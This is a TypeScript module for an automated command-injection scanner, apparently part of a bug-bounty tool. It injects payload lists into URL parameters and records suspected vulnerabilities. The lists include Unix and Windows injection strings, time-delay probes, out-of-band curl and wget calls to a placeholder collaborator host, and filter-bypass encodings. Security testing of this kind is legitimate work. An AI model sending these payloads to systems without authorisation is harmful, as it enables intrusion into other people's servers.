/**
 * Command Injection Agent
 * Based on PayloadsAllTheThings/Command Injection
 * 
 * Detects and exploits OS command injection:
 * - Basic command injection
 * - Blind command injection
 * - Time-based detection
 * - Out-of-band detection
 * - Filter bypass techniques
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import logger from '../utils/logger';
import database from '../services/database';

interface CommandInjectionJob {
  programId: string;
  scanId: string;
  urls: string[];
  options?: {
    testBlind?: boolean;
    testTimeBased?: boolean;
    collaboratorDomain?: string;
  };
}

// Command Injection Payloads
const CMD_PAYLOADS = {
  // Basic injection (Unix)
  unixBasic: [
    '; id',
    '| id',
    '|| id',
    '& id',
    '&& id',
    '`id`',
    '$(id)',
    '\n id',
    '\r\n id',
    '; id #',
    '| id #',
    '`id`',
  ],

  // Basic injection (Windows)
  windowsBasic: [
    '& whoami',
    '| whoami',
    '|| whoami',
    '&& whoami',
    '\n whoami',
    '; whoami',
  ],

  // Time-based (Unix)
  unixTimeBased: [
    '; sleep 5',
    '| sleep 5',
    '|| sleep 5',
    '& sleep 5',
    '&& sleep 5',
    '`sleep 5`',
    '$(sleep 5)',
    '; sleep 5 #',
  ],

  // Time-based (Windows)
  windowsTimeBased: [
    '& ping -n 5 127.0.0.1',
    '| ping -n 5 127.0.0.1',
    '|| ping -n 5 127.0.0.1',
    '&& timeout 5',
  ],

  // Out-of-band (Unix)
  unixOOB: [
    '; curl http://COLLABORATOR',
    '| curl http://COLLABORATOR',
    '`curl http://COLLABORATOR`',
    '$(curl http://COLLABORATOR)',
    '; wget http://COLLABORATOR',
    '; nslookup COLLABORATOR',
    '`nslookup COLLABORATOR`',
  ],

  // Out-of-band (Windows)
  windowsOOB: [
    '& nslookup COLLABORATOR',
    '| nslookup COLLABORATOR',
    '& ping COLLABORATOR',
    '& curl http://COLLABORATOR',
  ],

  // Filter bypass
  filterBypass: [
    // Space bypass
    ';{id}',
    ';id${IFS}',
    ';id$IFS',
    ';{id,}',
    ';id%09',  // Tab
    ';id%0a',  // Newline
    // Quote bypass
    "';id'",
    '";id"',
    // Backslash bypass
    ';i\\d',
    ';/b\\in/\\id',
    // Variable bypass
    ';$u$n$a$m$e',
    ';${PATH:0:1}bin${PATH:0:1}id',
    // Encoding bypass
    ';$(echo aWQ= | base64 -d)',
    ';`echo aWQ= | base64 -d`',
    // Wildcard bypass
    ';/???/??',
    ';/???/i?',
  ],

  // Argument injection
  argumentInjection: [
    '-v',
    '--version',
    '--help',
    '-h',
    '-n',
    '-e',
    '-c',
  ],
};

export class CommandInjectionAgent extends BaseAgent<CommandInjectionJob> {
  constructor() {
    super('commandinjection');
  }

  protected getSteps() {
    return [
      { name: 'Identify injection points', metadata: {} },
      { name: 'Test basic command injection', metadata: {} },
      { name: 'Test time-based injection', metadata: {} },
      { name: 'Test out-of-band injection', metadata: {} },
      { name: 'Test filter bypass techniques', metadata: {} },
    ];
  }

  async process(job: Job<CommandInjectionJob>): Promise<any> {
    const { programId, scanId, urls, options = {} } = job.data;
    const findings: any[] = [];
    const collaborator = options.collaboratorDomain || 'collaborator.example.com';

    logger.info({ urlCount: urls.length }, 'Starting command injection testing');

    for (const url of urls) {
      try {
        // Test basic injection
        const basicFindings = await this.testBasicInjection(url);
        findings.push(...basicFindings);

        // Test time-based
        if (options.testTimeBased !== false) {
          const timeFindings = await this.testTimeBasedInjection(url);
          findings.push(...timeFindings);
        }

        // Test blind/OOB
        if (options.testBlind) {
          const oobFindings = await this.testOOBInjection(url, collaborator);
          findings.push(...oobFindings);
        }

        // Test filter bypass
        const bypassFindings = await this.testFilterBypass(url);
        findings.push(...bypassFindings);
      } catch (error) {
        logger.error({ error, url }, 'Error testing command injection');
      }
    }

    // Store findings
    for (const finding of findings) {
      await this.storeFinding(programId, scanId, finding);
    }

    return {
      totalUrls: urls.length,
      findings: findings.length,
      vulnerabilities: findings,
    };
  }

  private async testBasicInjection(url: string): Promise<any[]> {
    const findings: any[] = [];
    const urlObj = new URL(url);

    for (const [param, value] of urlObj.searchParams.entries()) {
      // Test Unix payloads
      for (const payload of CMD_PAYLOADS.unixBasic) {
        try {
          const testUrl = new URL(url);
          testUrl.searchParams.set(param, value + payload);
          const response = await fetch(testUrl.toString());
          const body = await response.text();

          // Check for command output
          if (body.includes('uid=') && body.includes('gid=')) {
            findings.push({
              type: 'command-injection',
              url,
              parameter: param,
              payload,
              os: 'unix',
              severity: 'critical',
              evidence: 'Command output (id) in response',
              impact: 'Remote Code Execution',
            });
            return findings; // Found, stop testing
          }
        } catch (error) {
          // Continue
        }
      }

      // Test Windows payloads
      for (const payload of CMD_PAYLOADS.windowsBasic) {
        try {
          const testUrl = new URL(url);
          testUrl.searchParams.set(param, value + payload);
          const response = await fetch(testUrl.toString());
          const body = await response.text();

          if (body.includes('\\Users\\') || body.includes('AUTHORITY\\')) {
            findings.push({
              type: 'command-injection',
              url,
              parameter: param,
              payload,
              os: 'windows',
              severity: 'critical',
              evidence: 'Command output (whoami) in response',
              impact: 'Remote Code Execution',
            });
            return findings;
          }
        } catch (error) {
          // Continue
        }
      }
    }

    return findings;
  }

  private async testTimeBasedInjection(url: string): Promise<any[]> {
    const findings: any[] = [];
    const urlObj = new URL(url);

    for (const [param, value] of urlObj.searchParams.entries()) {
      // Test Unix time-based
      for (const payload of CMD_PAYLOADS.unixTimeBased) {
        try {
          const testUrl = new URL(url);
          testUrl.searchParams.set(param, value + payload);

          const startTime = Date.now();
          await fetch(testUrl.toString());
          const elapsed = Date.now() - startTime;

          if (elapsed > 4500) { // 5 second sleep
            findings.push({
              type: 'command-injection-blind',
              url,
              parameter: param,
              payload,
              os: 'unix',
              severity: 'critical',
              evidence: `Response delayed by ${elapsed}ms`,
              technique: 'time-based',
              impact: 'Blind Remote Code Execution',
            });
            return findings;
          }
        } catch (error) {
          // Continue
        }
      }

      // Test Windows time-based
      for (const payload of CMD_PAYLOADS.windowsTimeBased) {
        try {
          const testUrl = new URL(url);
          testUrl.searchParams.set(param, value + payload);

          const startTime = Date.now();
          await fetch(testUrl.toString());
          const elapsed = Date.now() - startTime;

          if (elapsed > 4500) {
            findings.push({
              type: 'command-injection-blind',
              url,
              parameter: param,
              payload,
              os: 'windows',
              severity: 'critical',
              evidence: `Response delayed by ${elapsed}ms`,
              technique: 'time-based',
            });
            return findings;
          }
        } catch (error) {
          // Continue
        }
      }
    }

    return findings;
  }

  private async testOOBInjection(url: string, collaborator: string): Promise<any[]> {
    const findings: any[] = [];
    const urlObj = new URL(url);

    for (const [param, value] of urlObj.searchParams.entries()) {
      for (const payload of CMD_PAYLOADS.unixOOB) {
        try {
          const oobPayload = payload.replace('COLLABORATOR', collaborator);
          const testUrl = new URL(url);
          testUrl.searchParams.set(param, value + oobPayload);

          await fetch(testUrl.toString());

          // Note: Would need to check collaborator for callbacks
          findings.push({
            type: 'command-injection-oob-test',
            url,
            parameter: param,
            payload: oobPayload,
            severity: 'info',
            evidence: 'OOB payload sent - check collaborator for callback',
            collaborator,
          });
        } catch (error) {
          // Continue
        }
      }
    }

    return findings;
  }

  private async testFilterBypass(url: string): Promise<any[]> {
    const findings: any[] = [];
    const urlObj = new URL(url);

    for (const [param, value] of urlObj.searchParams.entries()) {
      for (const payload of CMD_PAYLOADS.filterBypass) {
        try {
          const testUrl = new URL(url);
          testUrl.searchParams.set(param, value + payload);
          const response = await fetch(testUrl.toString());
          const body = await response.text();

          if (body.includes('uid=') || body.includes('Linux') || body.includes('Darwin')) {
            findings.push({
              type: 'command-injection-filter-bypass',
              url,
              parameter: param,
              payload,
              severity: 'critical',
              evidence: 'Filter bypassed, command executed',
              technique: 'filter-bypass',
            });
            return findings;
          }
        } catch (error) {
          // Continue
        }
      }
    }

    return findings;
  }

  private async storeFinding(programId: string, scanId: string, finding: any): Promise<void> {
    try {
      await database.query(
        `INSERT INTO vulnerabilities (program_id, scan_id, type, url, severity, details, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)`,
        [programId, scanId, finding.type, finding.url, finding.severity, JSON.stringify(finding)]
      );
    } catch (error) {
      logger.error({ error }, 'Failed to store command injection finding');
    }
  }
}

export default new CommandInjectionAgent();
